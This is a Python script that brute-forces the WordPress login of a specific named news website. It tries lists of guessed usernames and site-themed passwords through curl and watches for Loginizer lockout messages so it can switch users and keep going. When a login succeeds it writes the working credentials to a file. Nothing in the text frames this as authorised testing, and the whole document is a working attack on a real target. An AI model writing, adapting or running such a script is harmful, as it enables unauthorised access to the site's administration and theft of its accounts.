import subprocess, re, time, urllib.parse
B = "https://mediaaksara.id/wp-login.php"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129"
USERS = ["adminnick", "aksara-wijaya", "nick", "admin"]
PW = ["mediaaksara", "aksara123", "media123", "aksara2024", "aksara2025", "aksara2026",
      "admin123", "admin@123", "password", "mediaaksara123", "media", "aksara",
      "cibadak", "bogor123", "berita123"]

def attempt(u, p, jar):
    g = subprocess.run(["curl", "-sk", "--http1.1", "-A", UA, "--max-time", "12", "-c", jar,
                        B, "-o", "/tmp/lgf"], capture_output=True)
    body = open("/tmp/lgf", encoding="latin-1", errors="ignore").read()
    tok = re.findall(r'name="_wp_http_referent"?[^>]*value="([^"]+)"', body)
    data = {"log": u, "pwd": p, "wp-submit": "Log In", "redirect_to": "", "testcookie": "1"}
    ck = jar + ".ck"
    r = subprocess.run(["curl", "-sk", "--http1.1", "-A", UA, "--max-time", "15", "-b", ck, "-c", ck,
                        "-e", B, "-o", "/tmp/lgr", "-w", "%{http_code}|%{redirect_url}",
                        "-H", "Cookie: wordpress_test_cookie=WP%20Cookie%20check",
                        "--data", urllib.parse.urlencode(data), B], capture_output=True)
    code, red = (r.stdout.decode().split("|") + [""])[:2]
    resp = open("/tmp/lgr", encoding="latin-1", errors="ignore").read()
    blocked = bool(re.findall(r"(?i)(too many|terlalu banyak|locked|blocked|percobaan)", resp))
    err = bool(re.findall(r"(?i)(incorrect|wrong password|salah|Empty)", resp))
    ok = code == "302" and "wp-admin" in red and "login" not in red.lower()
    return code, red, ok, blocked, err

n = 0
for u in USERS:
    for p in PW:
        jar = "/tmp/jb_" + re.sub(r"\W", "_", u)
        code, red, ok, blocked, err = attempt(u, p, jar)
        n += 1
        tag = "*** WIN ***" if ok else ("LOCK?" if blocked else ("bad" if err else "?"))
        print(f"[{n:2}] {u:14}/{p:15} {code} {tag} {red[:40]}", flush=True)
        if ok:
            open("/home/runner/p2s/ma_cred.txt", "w").write(f"{u}/{p}\n")
            raise SystemExit
        if blocked:
            print("loginizer kena, ganti user"); break
        time.sleep(7)
